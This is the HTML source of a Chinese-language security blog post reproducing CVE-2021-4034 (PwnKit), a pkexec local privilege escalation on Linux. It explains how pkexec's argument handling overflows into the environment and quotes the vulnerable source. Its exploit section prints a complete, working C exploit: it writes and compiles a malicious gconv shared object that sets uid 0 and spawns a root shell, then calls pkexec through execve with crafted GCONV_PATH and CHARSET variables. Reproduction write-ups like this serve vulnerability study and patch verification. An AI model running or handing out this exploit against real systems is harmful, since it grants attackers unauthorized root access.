@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>pkexec 本地提权</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='pkexec 本地提权'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-01-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-01-01T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="pkexec 本地提权">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E5%A4%8D%E7%8E%B0-1/">
+                <img src="/p/%E5%A4%8D%E7%8E%B0-1/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/%E5%A4%8D%E7%8E%B0-1/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/%E5%A4%8D%E7%8E%B0-1/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post pkexec 本地提权" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="background-color: #2a9d8f; color: #fff;">
+                漏洞复现
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/%E5%A4%8D%E7%8E%B0-1/">pkexec 本地提权</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 01, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="pkexec-本地提权">pkexec 本地提权</h1>
+<p>CVE-2021-4034</p>
+<h2 id="简介">简介</h2>
+<p>Polkit是一个用于控制类Unix系统中控制系统范围权限的组件，它为非特权进程与特权进程的通信提供了一种有组织的方式。</p>
+<p>pkexec是Polkit开源应用框架的一部分，它负责协商特权进程和非特权进程之间的互动，允许授权用户以另一个用户的身份执行命令，和 sudo 等程序不同，Polkit 并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。</p>
+<blockquote>
+<p>pkexec是一个suid文件：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1413; 
+			flex-basis: 3391px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160034367.png" data-size="537x38">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160034367.png"
+			width="537"
+			height="38"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160034367_hue5d085dd5e157f9aad50184576a4d63f_10997_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-1/image-20220223160034367_hue5d085dd5e157f9aad50184576a4d63f_10997_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<ul>
+<li><strong>pkexec执行<code>whoami</code>：</strong></li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 374; 
+			flex-basis: 899px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160402003.png" data-size="1031x275">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160402003.png"
+			width="1031"
+			height="275"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160402003_huf588e00e46ec3eb998be7109db3f2fbd_57086_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-1/image-20220223160402003_huf588e00e46ec3eb998be7109db3f2fbd_57086_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>输入root认证密码后：</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1117; 
+			flex-basis: 2681px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160436706.png" data-size="391x35">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160436706.png"
+			width="391"
+			height="35"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160436706_hud20c645fb419d71ed9aa50504addc7fd_5784_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-1/image-20220223160436706_hud20c645fb419d71ed9aa50504addc7fd_5784_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="漏洞信息">漏洞信息</h2>
+<p>当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。</p>
+<p><strong>影响范围：</strong></p>
+<p>影响2009年 - 今的版本(当前0.105)</p>
+<h2 id="复现环境">复现环境</h2>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1116; 
+			flex-basis: 2680px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160634660.png" data-size="994x89">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160634660.png"
+			width="994"
+			height="89"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223160634660_hue34018282c332b5fce078a0c3e591e6b_23152_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-1/image-20220223160634660_hue34018282c332b5fce078a0c3e591e6b_23152_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="漏洞原理">漏洞原理</h2>
+<pre tabindex="0"><code>int
+main (int argc, char *argv[])
+{
+    
+  ··· ···
+  ··· ···
+      
+ // 从1开始
+  for (n = 1; n &lt; (guint) argc; n++) 
+    {
+      if (strcmp (argv[n], &quot;--help&quot;) == 0)
+        {
+          opt_show_help = TRUE;
+        }
+      else
+        {
+          break;
+        }
+    }
+
+  ··· ···
+
+  g_assert (argv[argc] == NULL);
+  path = g_strdup (argv[n]); //获取要执行的命令
+  if (path == NULL)
+    {
+      ···
+    }
+  if (path[0] != '/')
+    {
+      // 该函数根据PATH环境变量寻找要执行命令的绝对路径
+      s = g_find_program_in_path (path); 
+      if (s == NULL)
+        {
+          ···
+        }
+      g_free (path);
+      argv[n] = path = s;//获取到地址后，修改命令行参数
+    }
+  ··· ···
+  ··· ···
+
+</code></pre><p>大致是这样的流程：</p>
+<ul>
+<li>从<code>1</code>开始获取参数值，表明默认在pkexec后会跟着一个要执行的命令，例如<code>pkexec whoami</code></li>
+<li>匹配到命令后传入<code>g_find_program_in_path</code>函数，该函数负责根据PATH环境变量寻找要执行命令的绝对路径，例如<code>/usr/bin/whoami</code></li>
+<li>最后写回命令行参数，就可以执行</li>
+</ul>
+<p>Linux二进制程序运行时会将命令行参数<code>argv[]</code>和环境变量<code>environ[]</code>放到栈底部，并且<code>argv[]</code> 和 <code>environ[]</code> 是连续的。</p>
+<p>当以命令行启动pkexec，arg[0]=&lsquo;pkexec&rsquo;，arg[1]='\x00'，运行正常。但是当以execve函数启动的pkexec ，不带任何其他参数，那么argv[0] 为''\x00'，<code>argv[1]</code> 环境变量就会<strong>越界</strong>到 environ[0]。</p>
+<p>那么利用思路就是以execve函数启动pkexec，且不带参数，并伪造环境变量。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>POC中最终寻找到的是<code>GCONV_PATH</code>环境变量，利用其完成恶意so文件加载并执行恶意代码。</p>
+<p><strong>exp：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">shell</span> <span class="o">=</span>
+        <span class="s">&#34;#include &lt;stdio.h&gt;</span><span class="se">\n</span><span class="s">&#34;</span>
+        <span class="s">&#34;#include &lt;stdlib.h&gt;</span><span class="se">\n</span><span class="s">&#34;</span>
+        <span class="s">&#34;#include &lt;unistd.h&gt;</span><span class="se">\n\n</span><span class="s">&#34;</span>
+        <span class="s">&#34;void gconv() {}</span><span class="se">\n</span><span class="s">&#34;</span>
+        <span class="s">&#34;void gconv_init() {</span><span class="se">\n</span><span class="s">&#34;</span>
+        <span class="s">&#34;       setuid(0); setgid(0);</span><span class="se">\n</span><span class="s">&#34;</span>
+        <span class="s">&#34;       seteuid(0); setegid(0);</span><span class="se">\n</span><span class="s">&#34;</span>
+        <span class="s">&#34;       system(</span><span class="se">\&#34;</span><span class="s">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#39;GCONV_PATH=.&#39; &#39;pwnkit&#39;; /bin/sh</span><span class="se">\&#34;</span><span class="s">);</span><span class="se">\n</span><span class="s">&#34;</span>
+        <span class="s">&#34;       exit(0);</span><span class="se">\n</span><span class="s">&#34;</span>
+        <span class="s">&#34;}&#34;</span><span class="p">;</span>
+        
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+        <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;mkdir -p &#39;GCONV_PATH=.&#39;; touch &#39;GCONV_PATH=./pwnkit&#39;; chmod a+x &#39;GCONV_PATH=./pwnkit&#39;&#34;</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;mkdir -p pwnkit; echo &#39;module UTF-8// PWNKIT// pwnkit 2&#39; &gt; pwnkit/gconv-modules&#34;</span><span class="p">);</span>
+        <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;pwnkit/pwnkit.c&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="p">);</span>
+        <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span> 
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&#34;</span><span class="p">);</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;pwnkit&#34;</span><span class="p">,</span> <span class="s">&#34;PATH=GCONV_PATH=.&#34;</span><span class="p">,</span> <span class="s">&#34;CHARSET=PWNKIT&#34;</span><span class="p">,</span> <span class="s">&#34;SHELL=pwnkit&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
+        <span class="n">execve</span><span class="p">(</span><span class="s">&#34;/usr/bin/pkexec&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">[]){</span><span class="nb">NULL</span><span class="p">},</span> <span class="n">env</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 683; 
+			flex-basis: 1640px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223171504798.png" data-size="998x146">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223171504798.png"
+			width="998"
+			height="146"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-1/image-20220223171504798_hua881c43fa9854f5d9232c3fb057aea99_31021_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-1/image-20220223171504798_hua881c43fa9854f5d9232c3fb057aea99_31021_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/%E5%A4%8D%E7%8E%B0-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%A4%8D%E7%8E%B0-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Activemq 任意文件写入漏洞"
+                        data-key="复现-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Activemq 任意文件写入漏洞</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-5/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-5/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post thinkphp5.1.* - 反序列化"
+                        data-key="php-5" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">thinkphp5.1.* - 反序列化</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#简介">简介</a></li>
+    <li><a href="#漏洞信息">漏洞信息</a></li>
+    <li><a href="#复现环境">复现环境</a></li>
+    <li><a href="#漏洞原理">漏洞原理</a></li>
+    <li><a href="#漏洞利用">漏洞利用</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
